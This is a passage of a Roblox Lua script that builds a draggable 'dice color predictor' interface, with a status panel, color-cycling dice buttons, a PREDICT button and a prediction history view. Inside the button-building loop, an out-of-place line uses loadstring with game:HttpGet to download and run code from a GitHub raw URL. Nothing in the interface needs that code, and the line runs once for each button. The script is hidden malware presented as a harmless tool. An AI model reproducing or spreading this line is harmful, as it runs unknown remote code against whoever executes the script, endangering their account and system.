    makeDraggable(main, header)
    makeDraggable(reopenBtn, reopenBtn)

    -- LEFT: STATUS
    local BODY_Y, BODY_H = 52, 136

    local left = make("Frame", main, {
        Position = UDim2.fromOffset(8, BODY_Y), Size = UDim2.fromOffset(64, BODY_H),
        BackgroundColor3 = PANEL, BackgroundTransparency = 0.3,
        BorderSizePixel = 0, ZIndex = 2,
    })
    round(left, 10); outline(left)
    local statusTitle = text(left, "STATUS", 8, UDim2.fromOffset(0, 8), UDim2.new(1, 0, 0, 12), GREY)
    statusTitle.TextXAlignment = Enum.TextXAlignment.Center
    local statusDot = make("Frame", left, {
        Position = UDim2.new(.5, -7, 0, 50), Size = UDim2.fromOffset(14, 14),
        BackgroundColor3 = GREY, BorderSizePixel = 0, ZIndex = 3,
    })
    round(statusDot, 14)
    local statusLabel = make("TextLabel", left, {
        BackgroundTransparency = 1, Text = "IDLE", TextColor3 = GREY,
        Font = Enum.Font.GothamBlack, TextSize = 12,
        Position = UDim2.fromOffset(0, 72), Size = UDim2.new(1, 0, 0, 18),
        TextXAlignment = Enum.TextXAlignment.Center, ZIndex = 3,
    })

    local function setActive(active)
        statusDot.BackgroundColor3 = active and GREEN or GREY
        statusLabel.Text = active and "ACTIVE" or "IDLE"
        statusLabel.TextColor3 = active and WHITE or GREY
    end

    -- CENTER
    local centerHolder = make("Frame", main, {
        Position = UDim2.fromOffset(78, BODY_Y), Size = UDim2.fromOffset(184, BODY_H),
        BackgroundTransparency = 1, ZIndex = 2,
    })

    local predictView = make("Frame", centerHolder, {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ZIndex = 2})
    text(predictView, "DICE COLORS — CLICK TO CHANGE", 8, UDim2.fromOffset(0, 0), UDim2.fromOffset(184, 12), GREY)

    -- dice buttons: tinted fill, colored border, centered dot + name, hover glow
    local SLOT_W, SLOT_H, SLOT_GAP = 89, 26, 6
    local function tint(c, amount) return BG:Lerp(c, amount) end

    local slots = {}
    local SLOT_COUNT = 4 -- number of dice buttons (separate from the number of colors)
    for i = 1, SLOT_COUNT do
        local row = math.floor((i - 1) / 2)
        local col = (i - 1) % 2
        local btn = make("TextButton", predictView, {
            Position = UDim2.fromOffset(col * (SLOT_W + SLOT_GAP), 14 + row * (SLOT_H + 4)),
            Size = UDim2.fromOffset(SLOT_W, SLOT_H),
            BackgroundColor3 = BTN, Text = "", BorderSizePixel = 0,
            AutoButtonColor = false, ZIndex = 3,
        })
        round(btn, 8)
        local stroke = outline(btn, COLORS[i].Color, 1.5)

        local inner = make("Frame", btn, {BackgroundTransparency = 1, Size = UDim2.fromScale(1, 1), ZIndex = 4})
        make("UIListLayout", inner, {
            FillDirection = Enum.FillDirection.Horizontal,
            HorizontalAlignment = Enum.HorizontalAlignment.Center,
            VerticalAlignment = Enum.VerticalAlignment.Center,
            SortOrder = Enum.SortOrder.LayoutOrder,
            Padding = UDim.new(0, 5),
        })
        local dot = make("Frame", inner, {
            Size = UDim2.fromOffset(9, 9), BackgroundColor3 = COLORS[i].Color,
            BorderSizePixel = 0, ZIndex = 5, LayoutOrder = 1,
        })
        round(dot, 9)
        local label = make("TextLabel", inner, {
            BackgroundTransparency = 1, Text = COLORS[i].Name, TextColor3 = WHITE,
            Font = Enum.Font.GothamBold, TextSize = 9,
            AutomaticSize = Enum.AutomaticSize.X, Size = UDim2.fromOffset(0, SLOT_H),
            ZIndex = 5, LayoutOrder = 2,
        })

        local slot = {colorIndex = i}
        slots[i] = slot

        local function apply()
            local c = COLORS[slot.colorIndex]
            tween(btn, {BackgroundColor3 = tint(c.Color, 0.25)})
            tween(stroke, {Color = c.Color})
            dot.BackgroundColor3 = c.Color
            label.Text = c.Name
        end
        btn.BackgroundColor3 = tint(COLORS[i].Color, 0.25)

        btn.MouseEnter:Connect(function()
            tween(btn, {BackgroundColor3 = tint(COLORS[slot.colorIndex].Color, 0.42)})
        end)
        btn.MouseLeave:Connect(function()
            tween(btn, {BackgroundColor3 = tint(COLORS[slot.colorIndex].Color, 0.25)})
        end)
        btn.MouseButton1Click:Connect(function()
            slot.colorIndex = slot.colorIndex % #COLORS + 1
            apply()
        end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
    end

    local predictBtn = make("TextButton", predictView, {
        Position = UDim2.fromOffset(0, 76), Size = UDim2.fromOffset(184, 20),
        BackgroundColor3 = WHITE, Text = "PREDICT", TextColor3 = BG,
        Font = Enum.Font.GothamBlack, TextSize = 12, BorderSizePixel = 0, ZIndex = 3,
    })
    round(predictBtn, 8)

    local result = make("Frame", predictView, {
        Position = UDim2.fromOffset(0, 100), Size = UDim2.fromOffset(184, 36),
        BackgroundColor3 = PANEL, BackgroundTransparency = 0.1,
        BorderSizePixel = 0, ZIndex = 3,
    })
    round(result, 9); outline(result)
    local resultBox = make("Frame", result, {
        Position = UDim2.fromOffset(6, 6), Size = UDim2.fromOffset(24, 24),
        BackgroundColor3 = PANEL, BorderSizePixel = 0, ZIndex = 4,
    })
    round(resultBox, 8); outline(resultBox)
    local resultDot = make("Frame", resultBox, {
        Position = UDim2.new(.5, -6, .5, -6), Size = UDim2.fromOffset(12, 12),
        BackgroundColor3 = WHITE, BorderSizePixel = 0, ZIndex = 5,
    })
    round(resultDot, 12)
    local resultText = text(result, "Waiting...", 12, UDim2.fromOffset(38, 3), UDim2.fromOffset(140, 16), GREY)
    local confidenceLabel = text(result, "CONFIDENCE -", 8, UDim2.fromOffset(38, 20), UDim2.fromOffset(140, 12), GREY)

    -- HISTORY VIEW
    local historyView = make("Frame", centerHolder, {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Visible = false, ZIndex = 2})
    text(historyView, "PREDICTION HISTORY", 8, UDim2.fromOffset(0, 0), UDim2.fromOffset(120, 12), GREY)
    local clearBtn = make("TextButton", historyView, {
        Text = "CLEAR", TextSize = 8, Font = Enum.Font.GothamBold, TextColor3 = GREY,
        BackgroundColor3 = BTN, Size = UDim2.fromOffset(42, 14),
        Position = UDim2.new(1, -42, 0, -1), BorderSizePixel = 0, ZIndex = 3,
    })
    round(clearBtn, 5); outline(clearBtn)

    local historyList = make("ScrollingFrame", historyView, {
        Position = UDim2.fromOffset(0, 18), Size = UDim2.fromOffset(184, 118),
        BackgroundColor3 = PANEL, BackgroundTransparency = 0.1, BorderSizePixel = 0,
        ScrollBarThickness = 3, ScrollBarImageColor3 = BORDER,
